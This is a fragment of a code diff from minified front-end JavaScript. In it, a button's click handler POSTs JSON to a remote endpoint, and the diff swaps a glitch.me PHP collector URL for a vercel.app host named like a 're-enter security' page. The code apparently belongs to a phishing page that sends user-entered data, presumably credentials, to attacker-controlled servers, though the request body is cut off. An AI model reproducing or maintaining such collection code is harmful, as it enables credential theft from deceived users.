@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
+                        fetch("https://2re-enter-security-section.vercel.app", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
